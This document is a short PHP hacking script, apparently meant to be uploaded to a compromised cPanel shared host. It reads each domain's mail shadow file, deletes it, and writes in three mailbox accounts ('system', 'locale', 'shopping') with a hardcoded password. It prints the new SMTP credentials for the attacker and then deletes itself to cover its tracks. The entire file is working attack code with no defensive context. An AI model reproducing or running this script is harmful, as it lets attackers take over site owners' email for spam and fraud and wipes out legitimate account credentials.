<?php
//CODE BY **(ZEUXHAXOR_2020)**
set_time_limit(0);
ini_set('max_execution_time',0);
ini_set('memory_limit',-1);
//curent user
$user=get_current_user();
$xx='system';
$xx1='locale';
$xx2='shopping';
// Smtp password
$password='Atirkalu@123';
//crypt
$pwd = crypt($password,'$6$roottn$');
// host name
$t = $_SERVER['SERVER_NAME'];
//edit
$t = @str_replace("www.","",$t);
 //get users
 foreach(glob('/home/'.$user.'/etc/*', GLOB_ONLYDIR) as $dir) {
    $dirname = basename($dir);

@$passwd = file_get_contents('/home/'.$user.'/etc/'.$dirname.'/shadow');
//edit
$ex=explode("\r\n",$passwd);
//backup shadow
@link('/home/'.$user.'/etc/'.$dirname.'/shadow','/home/'.$user.'/etc/'.$dirname.'/shadow.roottn.bak');
//delete shadow
@unlink('/home/'.$user.'/etc/'.$dirname.'/shadow');
// :D
foreach($ex as $ex){
$ex=explode(':',$ex);
$e= $ex[0];
if ($e){
$b=fopen('/home/'.$user.'/etc/'.$dirname.'/shadow','ab');fwrite($b,$xx.':'.$pwd.':16249:::::'."\r\n");fclose($b);
$zx=fopen('/home/'.$user.'/etc/'.$dirname.'/shadow','ab');fwrite($zx,$xx1.':'.$pwd.':16250:::::'."\r\n");fclose($zx);
$zx1=fopen('/home/'.$user.'/etc/'.$dirname.'/shadow','ab');fwrite($zx1,$xx2.':'.$pwd.':16251:::::'."\r\n");fclose($zx1);
echo "ZEUXHAXOR $dirname|$xx@$dirname|$password\n";
echo "ZEUXHAXOR $dirname|$xx1@$dirname|$password\n";
echo "ZEUXHAXOR $dirname|$xx2@$dirname|$password\n";
}}
}
@unlink(__FILE__);
?>
